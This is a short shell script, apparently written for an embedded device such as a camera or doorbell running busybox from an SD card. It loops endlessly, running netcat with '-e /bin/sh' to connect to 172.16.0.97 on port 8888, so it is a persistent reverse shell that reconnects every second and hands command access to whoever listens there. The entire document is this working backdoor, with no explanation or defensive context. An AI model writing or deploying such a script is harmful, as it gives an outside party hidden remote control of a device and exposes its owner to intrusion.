#!/bin/sh

while true; do
    /media/mmc/door/busybox-mipsel nc 172.16.0.97 8888 -e /bin/sh
    sleep 1
done
